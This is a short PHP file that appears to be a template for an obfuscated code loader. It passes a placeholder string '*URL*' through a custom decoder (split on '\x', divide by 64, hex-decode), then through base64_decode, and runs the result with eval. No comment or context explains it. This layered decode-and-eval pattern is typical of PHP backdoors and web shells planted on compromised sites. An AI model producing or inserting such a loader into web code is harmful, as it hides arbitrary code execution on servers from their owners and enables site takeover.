<?php
eval(base64_decode(dec('*URL*', 64)));

function dec($v, $b) {
    $spl = explode('\x',$v);
    $rtn = '';
    foreach($spl as $x){
        if(is_numeric($x)) {
            $x=$x/$b;
        } else {
        }
        $rtn = $rtn.$x;
    }
    $rtn = hex2bin($rtn);
    return $rtn;
}
?>
